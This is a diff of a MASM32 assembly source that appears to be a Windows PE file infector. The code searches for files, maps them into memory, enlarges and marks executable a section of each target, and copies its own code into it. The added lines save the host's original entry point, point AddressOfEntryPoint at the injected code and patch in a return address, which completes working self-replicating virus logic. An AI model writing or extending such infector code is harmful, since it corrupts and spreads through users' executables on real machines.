@@ -12,7 +12,7 @@ option casemap:none
       include \masm32\include\windows.inc
       include \masm32\include\wdm.inc
       include \masm32\include\kernel32.inc
-	  include .\yharnam.inc
+      include .\yharnam.inc
 
       includelib \masm32\lib\kernel32.lib
 
@@ -270,7 +270,6 @@ loop_find_file:
 	push 0
 	call MapFileToRAM
 
-
 	; get PE header (base address + offset from the DOS header)
 	mov edi, (STACK_STORAGE PTR [esp]).fileView
 	add edi, [edi + 03Ch]
@@ -308,7 +307,7 @@ loop_find_file:
 	; update it
 	mov (IMAGE_SECTION_HEADER PTR [edx]).Characteristics, eax
 
-	; Update VirtualSize
+	; update VirtualSize
 	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).Misc
 	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
 	mov (IMAGE_SECTION_HEADER PTR [edx]).Misc, eax
@@ -318,23 +317,27 @@ loop_find_file:
 	add eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
 	mov (STACK_STORAGE PTR [esp]).offsetToDest, eax
 
-	; Update SizeOfRawData
+	; update SizeOfRawData
 	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
 	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
 	mov (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData, eax
 
-	; Update SizeOfImage
+	; update SizeOfImage
 	mov eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SizeOfImage
 	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
 	mov (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SizeOfImage, eax
 
-	; Update entry point
+	; save original entry point
+	mov eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).ImageBase
+	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint
+	mov (STACK_STORAGE PTR [esp]).origEntryPoint, eax
 	mov eax, (STACK_STORAGE PTR [esp]).offsetToDest
 	add eax, (start - data)
-	; raw address to virtual address
+	; physical to virtual address
 	mov ecx, (IMAGE_SECTION_HEADER PTR [edx]).VirtualAddress
 	sub ecx, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
 	add eax, ecx
+	; update it
 	mov (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint, eax
 
 
@@ -355,7 +358,12 @@ loop_find_file:
 	add edi, (STACK_STORAGE PTR [esp]).offsetToDest                 ; dst
 	mov ecx, (end_of_code - data)                                   ; length
 	rep movsb
-	;;
+
+	; set return address to the original entry point
+	mov edx, (STACK_STORAGE PTR [esp]).fileView
+	add edx, (STACK_STORAGE PTR [esp]).offsetToDest
+	mov eax, (STACK_STORAGE PTR [esp]).origEntryPoint
+	mov [edx + (returnAddr - data)], eax
 
 close_target:
 	push esp
